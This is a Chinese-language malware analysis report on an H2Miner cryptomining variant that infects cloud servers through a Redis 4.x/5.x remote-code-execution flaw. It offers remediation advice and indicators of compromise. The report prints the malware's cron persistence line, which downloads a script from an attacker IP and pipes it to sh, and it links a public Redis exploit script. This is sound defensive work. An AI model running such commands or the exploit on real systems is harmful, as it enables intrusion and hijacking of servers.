## 一、背景

腾讯主机安全（云镜）捕获H2Miner挖矿木马最新变种，该变种利用Redis 4.x/5.x
主从同步命令执行漏洞（CNVD-2019-21763）攻击云服务器，检测数据显示该木马活动有明显增长。由于用户将Redis默认端口6379暴露在公网且未使用强密码认证，导致攻击者入侵并通过Redis
4.x/5.x版本的主从同步功能执行任意代码。

H2Miner变种木马入侵后会下载kinsingXXXXXXXXXX（10位随机字符）木马作为挖矿木马kdevtmpfsi的维持进程，并且通过安装定时任务持久化、通过SSH复用连接进行横向移动感染。H2Miner挖矿木马会占用大量CPU资源进行挖矿计算，可能导致业务系统崩溃，该挖矿木马还会尝试卸载云服务器的安全软件。腾讯安全专家建议企业用户按照以下步骤进行自查以及处置：

1.Redis 非必要情况不要暴露在公网，使用足够强壮的Redis口令；

2.修改配置文件，限制访问Redis服务器的IP地址（bind 127.0.0.1或指定IP）；

3.排查Redis路径下是否残留red2.so、exp_lin.so文件，查询主机上是有否包含有kinsing（或kinsingXXXXXXXXXX）、kdevtmpfsi的文件或进程，是否有包含“195.3.146.118”的定时任务。

以上步骤可确认服务器是否被H2Miner​挖矿木马感染，如有发现，可以删除相关进程文件及定时任务。

  

## 二、详细分析

Redis 4.x/5.x
版本存在主从同步命令执行漏洞（CNVD-2019-21763​），攻击者通过构造特定的请求实现漏洞利用，成功利用漏洞可在目标服务器上实现Getshell，该漏洞风险较高，且漏洞利用方式已被公开。

(<https://github.com/Ridter/redis-rce/blob/master/redis-rce.py>)

由于Redis
4.x以及之后的版本，Redis新增了模块功能，用户可以通过外部拓展实现用户需要的功能，这样就可以在Redis中实现一个新的Redis命令。攻击者利用此功能（由Redis的主机实例通过fullresync同步到从机），使被攻击机加载恶意的模块red2.so文件，从而实现远程命令执行。

![](https://image.3001.net/images/20201124/1606216623_5fbcebaf1efaca3f489f8.png!small)

  

red2.so实现了shell命令的执行功能，可以接受攻击者指定的任意代码。

![](https://image.3001.net/images/20201124/1606216633_5fbcebb963ab709b3de75.png!small)

  

![](https://image.3001.net/images/20201124/1606216643_5fbcebc355a2efe751df1.png!small)

  

随后攻击者通过执行远程命令在Redis目录（/www/server/redis/）中下载了三个可执行文件并运行，文件名为kinsing+“10个随机字符”：

kinsinghoeF6X2YuD

kinsinghUvG9LNzhs

kinsingOtaaHxvErd

![](https://image.3001.net/images/20201124/1606216657_5fbcebd1aba3ff827855e.png!small)

  

对比发现三个文件其实相同，推测可能是由于重复入侵导致。该程序由GO语言开发，通过还原后的函数名进行对比，可知其是H2Miner此前的kinsing文件变种，并且与http[:]//45.10.88.124/kinsing下载得到的文件一致。

  

kinsingXXXXXXXXXX在函数main_redisBrute中实现redis爆破攻击功能。

![](https://image.3001.net/images/20201124/1606216666_5fbcebdac98aa38fe5101.png!small)

  

该样本会继续下载门罗币挖矿木马/tmp/kdevtmpfsi启动挖矿，导致大量CPU资源被占用，影响机器正常运转。

![](https://image.3001.net/images/20201124/1606216676_5fbcebe431f7ef8f4a94a.png!small)

  

下载http[:]//45.10.88.124/al.sh，尝试卸载阿里云骑士和腾讯云镜。

![](https://image.3001.net/images/20201124/1606216683_5fbcebebd2e0fe1243edd.png!small)

  

下载http[:]//45.10.88.124/cron.sh，安装定时任务：

"* * * * * $LDR http[:]//195.3.146.118/unk.sh | sh > /dev/null 2>&1"

![](https://image.3001.net/images/20201124/1606216693_5fbcebf58f0ae00eac470.png!small)

  

下载http[:]//45.10.88.124/spre.sh，尝试利用SSH连接复用进行横向移动：

![](https://image.3001.net/images/20201124/1606216702_5fbcebfe6da2dc7383a23.png!small)

  

与C2地址93.189.46.81通信。

![](https://image.3001.net/images/20201124/1606216710_5fbcec06f0286f8154cc4.png!small)

## IOCs

 **IP**

45.10.88.124

217.12.221.12

195.3.146.118

  

 **C &C**

93.189.46.81

  

 **MD5**

Kinsingxxxxxxxxxx

f5aba755aeeb0a5f4f4dc674c2970eea

  

kdevtmpfsi

8c6681daba966addd295ad89bf5146af

  

 **URL**

http[:]//45.10.88.124/spre.sh

http[:]//45.10.88.124/spr.sh

http[:]//45.10.88.124/al.sh

http[:]//45.10.88.124/cron.sh

http[:]//195.3.146.118/unk.sh

  

 **钱包：**

46V5WXwS3gXfsgR7fgXeGP4KAXtQTXJfkicBoRSHXwGbhVzj1JXZRJRhbMrvhxvXvgbJuyV3GGWzD6JvVMuQwAXxLZmTWkb

  

## 参考链接：

<https://s.tencent.com/research/bsafe/755.html>

https://developer.aliyun.com/article/741844

